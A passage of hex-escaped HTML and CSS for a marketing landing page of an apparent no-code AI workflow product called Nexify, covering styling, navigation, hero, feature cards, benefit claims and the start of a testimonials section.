20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.plan-price\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x203rem;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-weight:\x20800;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#8b5cf6;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin-bottom:\x2024px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.plan-price\x20span\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x201rem;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#7f7f92;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-weight:\x20500;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.plan-features\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20list-style:\x20none;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin-bottom:\x2032px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.plan-features\x20li\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2012px\x200;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-bottom:\x201px\x20solid\x20#f0eaff;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#454658;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-weight:\x20500;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.plan-features\x20li:last-child\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-bottom:\x20none;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20/*\x20CTA\x20Section\x20*/\x0a\x20\x20\x20\x20\x20\x20\x20\x20.cta-section\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x20100px\x200;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20linear-gradient(125deg,\x20#1e1a3a\x200%,\x20#2b1e4e\x20100%);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20text-align:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20white;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.cta-section\x20h2\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x202.6rem;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin-bottom:\x2020px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.cta-section\x20p\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x201.2rem;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20max-width:\x20650px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200\x20auto\x2032px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20opacity:\x200.85;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.cta-section\x20.cta-button\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20white;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#6d28d9;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20box-shadow:\x20none;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x201rem;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2014px\x2038px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.cta-section\x20.cta-button:hover\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20#f5f0ff;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20transform:\x20translateY(-2px);\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20/*\x20Footer\x20*/\x0a\x20\x20\x20\x20\x20\x20\x20\x20footer\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#0c0b15;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#a8a9bc;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2070px\x200\x2024px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.footer-content\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display:\x20grid;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20grid-template-columns:\x20repeat(auto-fit,\x20minmax(180px,\x201fr));\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20gap:\x2048px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin-bottom:\x2056px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.footer-column\x20h3\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x201.2rem;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#eef2ff;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin-bottom:\x2022px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-weight:\x20600;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.footer-links\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20list-style:\x20none;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.footer-links\x20li\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin-bottom:\x2012px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.footer-links\x20a\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#b9bad2;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20text-decoration:\x20none;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20transition:\x20color\x200.2s;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.footer-links\x20a:hover\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#c084fc;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20.copyright\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20text-align:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding-top:\x2028px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-top:\x201px\x20solid\x20#24213a;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x200.85rem;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20/*\x20Responsive\x20*/\x0a\x20\x20\x20\x20\x20\x20\x20\x20@media\x20(max-width:\x20992px)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.hero-content\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20flex-direction:\x20column;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20text-align:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.hero-text\x20p\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200\x20auto\x2030px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.hero-buttons\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justify-content:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.pricing-card.featured\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20transform:\x20none;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20@media\x20(max-width:\x20768px)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav-links\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display:\x20none;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.mobile-menu-btn\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display:\x20block;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.hero-text\x20h1\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x2038px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.section-title\x20h2\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x2030px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.testimonial\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2032px\x2024px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.testimonial-text\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x201rem;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20@media\x20(max-width:\x20560px)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.hero\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x20130px\x200\x2070px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.feature-card,\x20.benefit-item,\x20.pricing-card\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2024px\x2020px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20</style>\x0a</head>\x0a<body>\x0a\x20\x20\x20\x20<header>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22container\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<nav>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22logo\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22logo-icon\x22><i\x20class=\x22fas\x20fa-robot\x22></i></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22logo-text\x22>Nex<span>ify</span></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<ul\x20class=\x22nav-links\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li><a\x20href=\x22#features\x22>Capabilities</a></li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li><a\x20href=\x22#benefits\x22>Why\x20Nexify</a></li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li><a\x20href=\x22#testimonials\x22>Stories</a></li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li><a\x20href=\x22#pricing\x22>Plans</a></li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li><a\x20href=\x22#\x22>Resources</a></li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</ul>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<button\x20class=\x22cta-button\x22>Try\x20free\x20→</button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<button\x20class=\x22mobile-menu-btn\x22><i\x20class=\x22fas\x20fa-bars\x22></i></button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</nav>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20</header>\x0a\x0a\x20\x20\x20\x20<section\x20class=\x22hero\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22container\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22hero-content\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22hero-text\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1>Intelligent\x20workflows,\x20<span>built\x20without\x20limits</span></h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>Nexify\x20empowers\x20teams\x20to\x20design,\x20automate,\x20and\x20scale\x20AI-native\x20applications\x20—\x20no\x20deep\x20coding\x20required.\x20Connect\x20models,\x20data,\x20and\x20logic\x20visually.</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22hero-buttons\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<button\x20class=\x22cta-button\x22>Start\x20building\x20free</button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<button\x20class=\x22secondary-button\x22>Watch\x20demo</button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22hero-image\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://images.unsplash.com/photo-1581291518633-83b4ebd1d83e?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80\x22\x20alt=\x22Nexify\x20AI\x20Dashboard\x20concept\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20</section>\x0a\x0a\x20\x20\x20\x20<section\x20class=\x22features\x22\x20id=\x22features\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22container\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22section-title\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h2>Everything\x20you\x20need\x20to\x20build\x20with\x20AI</h2>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>From\x20prototype\x20to\x20production,\x20Nexify\x20combines\x20no‑code\x20simplicity\x20with\x20professional\x20flexibility.</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22features-grid\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22feature-card\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22feature-icon\x22><i\x20class=\x22fas\x20fa-cubes\x22></i></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>Visual\x20AI\x20Builder</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>Drag\x20&\x20drop\x20pre‑trained\x20models,\x20prompt\x20nodes,\x20and\x20logic\x20gates.\x20Build\x20complex\x20AI\x20chains\x20in\x20minutes.</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22feature-card\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22feature-icon\x22><i\x20class=\x22fas\x20fa-database\x22></i></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>Unified\x20Data\x20Hub</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>Connect\x20to\x20databases,\x20CRMs,\x20or\x20vector\x20stores.\x20Sync\x20live\x20data\x20without\x20writing\x20SQL\x20or\x20API\x20glue.</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22feature-card\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22feature-icon\x22><i\x20class=\x22fas\x20fa-cloud-upload-alt\x22></i></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>Deploy\x20anywhere</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>One‑click\x20cloud\x20deployment\x20or\x20self‑hosted\x20on\x20your\x20infrastructure.\x20Auto‑scaling\x20out\x20of\x20the\x20box.</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22feature-card\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22feature-icon\x22><i\x20class=\x22fas\x20fa-brain\x22></i></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>LLM\x20playground</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>Compare\x20GPT-4o,\x20Claude,\x20Gemini,\x20and\x20open‑source\x20models.\x20Tune\x20prompts\x20without\x20code.</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22feature-card\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22feature-icon\x22><i\x20class=\x22fas\x20fa-shield-hooded\x22></i></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>Enterprise\x20security</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>SSO,\x20RBAC,\x20data\x20encryption,\x20and\x20audit\x20logs\x20—\x20ready\x20for\x20regulated\x20industries.</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22feature-card\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22feature-icon\x22><i\x20class=\x22fas\x20fa-chalkboard-user\x22></i></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>Human-in-the-loop</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>Add\x20approvals,\x20reviews,\x20and\x20fallback\x20logic\x20to\x20keep\x20AI\x20workflows\x20reliable\x20and\x20safe.</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20</section>\x0a\x0a\x20\x20\x20\x20<section\x20class=\x22benefits\x22\x20id=\x22benefits\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22container\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22section-title\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h2>Why\x20forward‑thinking\x20teams\x20choose\x20Nexify</h2>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>Accelerate\x20AI\x20adoption\x20without\x20sacrificing\x20control\x20or\x20creativity.</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22benefits-grid\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22benefit-item\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22benefit-icon\x22><i\x20class=\x22fas\x20fa-gauge-high\x22></i></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>5x\x20faster\x20delivery</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>Build\x20AI\x20features\x20in\x20days\x20instead\x20of\x20sprints\x20—\x20from\x20idea\x20to\x20working\x20prototype.</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22benefit-item\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22benefit-icon\x22><i\x20class=\x22fas\x20fa-coins\x22></i></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>Reduce\x20costs\x20by\x2065%</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>Cut\x20infrastructure\x20overhead\x20and\x20developer\x20hours\x20with\x20visual\x20tooling.</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22benefit-item\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22benefit-icon\x22><i\x20class=\x22fas\x20fa-chalkboard\x22></i></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>Empower\x20domain\x20experts</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>Let\x20product\x20owners\x20and\x20analysts\x20build\x20intelligent\x20automations\x20safely.</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22benefit-item\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22benefit-icon\x22><i\x20class=\x22fas\x20fa-arrow-trend-up\x22></i></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>Future‑proof\x20scaling</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>From\x20hackathon\x20MVP\x20to\x20mission‑critical\x20AI\x20platform\x20on\x20the\x20same\x20stack.</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20</section>\x0a\x0a\x20\x20\x20\x20<section\x20class=\x22testimonials\x22\x20id=\x22testimonials\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22container\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22section-title\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h2>Loved\x20by\x20AI\x20pioneers\x20&\x20enterprises</h2>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>Join\